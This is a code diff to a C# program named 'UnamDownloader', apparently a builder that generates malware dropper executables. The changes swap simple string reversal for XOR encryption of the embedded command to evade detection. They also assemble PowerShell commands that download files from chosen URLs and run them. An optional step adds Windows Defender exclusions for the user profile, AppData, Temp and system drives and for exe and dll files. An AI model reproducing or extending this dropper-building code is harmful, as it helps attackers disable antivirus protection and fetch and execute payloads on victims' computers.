@@ -1,5 +1,6 @@
 ﻿using Microsoft.CSharp;
 using System;
+using System.CodeDom;
 using System.CodeDom.Compiler;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -100,8 +101,13 @@ namespace UnamDownloader
                 System.IO.File.WriteAllBytes(Path.Combine(currentDirectory, "manifest.o"), Properties.Resources.manifest);
             }
             StringBuilder sb = new StringBuilder(Properties.Resources.Program1);
-            sb.Replace("#COMMAND", ReverseString("cmd " + CreateCommand()));
-            sb.Replace("#RANDOM", RandomString(12));
+            string key = RandomString(32);
+            string command = "cmd " + CreateCommand();
+            sb.Replace("#COMMAND", ToLiteral(Cipher(command, key)).Replace("\" +", "\" \\"));
+            sb.Replace("#KEY", key);
+            sb.Replace("#LENGTH", command.Length.ToString());
+
+            System.IO.File.WriteAllText(Path.Combine(currentDirectory, filename + ".c"), sb.ToString());
 
             System.IO.File.WriteAllText(Path.Combine(currentDirectory, filename), sb.ToString());
             Process.Start(new ProcessStartInfo
@@ -125,20 +131,20 @@ namespace UnamDownloader
             for (int i = 0; i < count; i++)
             {
                 File filevar = ((File)listFiles.Items[i]);
-                string droplocation = filevar.comboDropLocation.Text == "Current Directory" ? "%cd%" : "%" + filevar.comboDropLocation.Text + "%";
-                downloads.Add(string.Format(@"powershell (New-Object System.Net.WebClient).DownloadFile('{0}', '{1}')", filevar.txtDownloadURL.Text, Path.Combine(droplocation, filevar.txtFilename.Text)));
+                string droplocation = (filevar.comboDropLocation.Text == "Current Directory" ? "($pwd).path" : "$env:" + filevar.comboDropLocation.Text);
+                downloads.Add(string.Format(@"powershell (New-Object System.Net.WebClient).DownloadFile('{0}', (Join-Path -Path {1} -ChildPath '{2}'))", filevar.txtDownloadURL.Text, droplocation, filevar.txtFilename.Text));
                 if (filevar.toggleExecute.Checked)
                 {
-                    executes.Add(string.Format(@"powershell Start-Process -FilePath '{0}'", Path.Combine(droplocation, filevar.txtFilename.Text)));
+                    executes.Add(string.Format(@"powershell Start-Process -FilePath (Join-Path -Path {0} -ChildPath '{1}')", droplocation, filevar.txtFilename.Text));
                 }
             }
-            return ("/c " + (checkWD.Checked ? "powershell -Command Add-MpPreference -ExclusionPath @('%UserProfile%','%AppData%','%Temp%','%SystemRoot%','%HomeDrive%','%SystemDrive%') -Force & powershell -Command Add-MpPreference -ExclusionExtension @('exe','dll') -Force & " : "") + string.Join(" & ", downloads.ToArray()) + (executes.Count > 0 ? " & " + string.Join(" & ", executes.ToArray()) : "") + " & exit").Replace(@"\", @"\\").Replace("\"", "\\\"");
+            return ("/c " + (checkWD.Checked ? "powershell -Command Add-MpPreference -ExclusionPath @($env:UserProfile,$env:AppData,$env:Temp,$env:SystemRoot,$env:HomeDrive,$env:SystemDrive) -Force & powershell -Command Add-MpPreference -ExclusionExtension @('exe','dll') -Force & " : "") + string.Join(" & ", downloads.ToArray()) + (executes.Count > 0 ? " & " + string.Join(" & ", executes.ToArray()) : "") + " & exit").Replace(@"\", @"\\").Replace("\"", "\\\"");
         }
 
         public string RandomString(int length)
         {
-            const string chars = "abcdefghijklmnpqrstuvwxyz";
-            const int clength = 25;
+            const string chars = "abcdefghijklmnpqrstuvwxyz0123456789";
+            const int clength = 35;
             var buffer = new char[length];
             for (var i = 0; i < length; ++i)
             {
@@ -147,12 +153,24 @@ namespace UnamDownloader
             return new string(buffer);
         }
 
-        public string ReverseString(string text)
+        public string Cipher(string data, string key)
         {
-            if (text == null) return null;
-            char[] array = text.ToCharArray();
-            Array.Reverse(array);
-            return new string(array);
+            var result = new StringBuilder();
+            for (int c = 0; c < data.Length; c++)
+                result.Append((char)((uint)data[c] ^ key[c % key.Length]));
+            return result.ToString();
+        }
+
+        private static string ToLiteral(string input)
+        {
+            using (var writer = new StringWriter())
+            {
+                using (var provider = CodeDomProvider.CreateProvider("CSharp"))
+                {
+                    provider.GenerateCodeFromExpression(new CodePrimitiveExpression(input), writer, null);
+                    return writer.ToString();
+                }
+            }
         }
 
         public string SaveDialog(string filter)
